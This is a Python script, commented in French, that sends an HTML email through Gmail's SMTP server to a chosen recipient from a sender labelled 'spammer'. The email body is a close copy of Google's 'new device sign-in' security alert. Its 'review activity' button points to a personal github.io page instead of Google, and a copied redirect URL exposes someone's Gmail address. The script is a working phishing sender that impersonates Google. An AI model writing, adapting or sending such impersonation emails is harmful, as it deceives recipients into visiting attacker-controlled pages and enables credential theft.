import smtplib, ssl
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

def EnvoyerCourriel(spammer, password_spammer, receiver):
	sender_email = spammer
	receiver_email = receiver
	password = password_spammer

	message = MIMEMultipart("alternative")
	message["Subject"] = "Alerte Google"
	message["From"] = sender_email
	message["To"] = receiver_email

	# Créer une version normale et une version HTML du courriel.
	text = """\
	Hi,
	How are you?
	Real Python has many great tutorials:
	www.realpython.com"""
	html = """\
	<html>
	<td>
	<div class="m_2653023233531793585mdv2rw" style="border-style:solid;border-width:thin;border-color:#dadce0;border-radius:8px;padding:40px 20px" align="center">
	<img src="https://ci3.googleusercontent.com/proxy/B8_0hh_kIBprLoT8bCePmfELNuVIhjgLTgDYWEe0RSzHp42ddUTNQ2tizIbDltIQPRrdXBsRm-EWiN3x_tupY9IbCUVKWS__eccUtcIL9n-ix3UoA7owUUXxHj8=s0-d-e1-ft#https://www.gstatic.com/accountalerts/email/googlelogo_color_188x64dp.png" style="width:75px;height:24px;margin-bottom:16px" class="CToWUd" height="24" width="75">
	<div style="font-family:'Google Sans',Roboto,RobotoDraft,Helvetica,Arial,sans-serif;border-bottom:thin solid #dadce0;color:rgba(0,0,0,0.87);line-height:32px;padding-bottom:24px;text-align:center;word-break:break-word">
	<div style="font-size:24px">Connexion sur un nouvel&nbsp;appareil</div>
	<table style="margin-top:8px" align="center">
	<tbody>
	<tr style="line-height:normal">
	</tr>
	</tbody>
	</table>
	</div>
	<div style="font-family:Roboto-Regular,Helvetica,Arial,sans-serif;font-size:14px;color:rgba(0,0,0,0.87);line-height:20px;padding-top:20px;text-align:center">
	Un utilisateur vient de se connecter à votre compte Google à partir d'un nouvel appareil. Nous vous envoyons cet e-mail pour vérifier qu'il s'agit bien de vous.
	<div style="padding-top:32px;text-align:center"><a href="https://nathanlessard.github.io/NathanLessard/" style="font-family:'Google Sans',Roboto,RobotoDraft,Helvetica,Arial,sans-serif;line-height:16px;color:#ffffff;font-weight:400;text-decoration:none;font-size:14px;display:inline-block;padding:10px 24px;background-color:#4184f3;border-radius:5px;min-width:90px" target="_blank" data-saferedirecturl="https://www.google.com/url?q=https://accounts.google.com/AccountChooser?Email%3Dcroux0719@gmail.com%26continue%3Dhttps://myaccount.google.com/alert/nt/1558032288000?rfn%253D31%2526rfnc%253D1%2526eid%253D-1655036117022694106%2526et%253D2%2526anexp%253Dgivab-fa--mdv2-fa--hsc-control_b--ivab-fa&amp;source=gmail&amp;ust=1558627516743000&amp;usg=AFQjCNF6EE2LvWoBtn0UWj0x4A-Rl7LChQ">Consulter
 	l'activité</a></div>
	</div>
	</div>
	<div style="text-align:left">
	<div style="font-family:Roboto-Regular,Helvetica,Arial,sans-serif;color:rgba(0,0,0,0.54);font-size:11px;line-height:18px;padding-top:12px;text-align:center">
	<div>Vous avez reçu cet e-mail pour vous informer de modifications importantes apportées à votre compte et aux services Google que vous utilisez.</div>
	<div style="direction:ltr">© 2019 Google LLC, <a class="m_2653023233531793585afal" style="font-family:Roboto-Regular,Helvetica,Arial,sans-serif;color:rgba(0,0,0,0.54);font-size:11px;line-height:18px;padding-top:12px;text-align:center">
	1600 Amphitheatre Parkway, Mountain View, CA 94043, USA</a></div>
	</div>
	</div>
	</td>
	</html>
	"""

	# Rend le contenu en objets MIMEText.
	part1 = MIMEText(text, "plain")
	part2 = MIMEText(html, "html")

	# Ajout des parties HTML/plain en message MIMEMultipart.
	# The email du client va tenter d'afficher la partie HTML en premier.
	message.attach(part1)
	message.attach(part2)

	# Crée un connexion sécurisée entre le serveur et le email de l'envoyeur.
	context = ssl.create_default_context()
	with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
    		server.login(sender_email, password)
    		server.sendmail(sender_email, receiver_email, message.as_string())
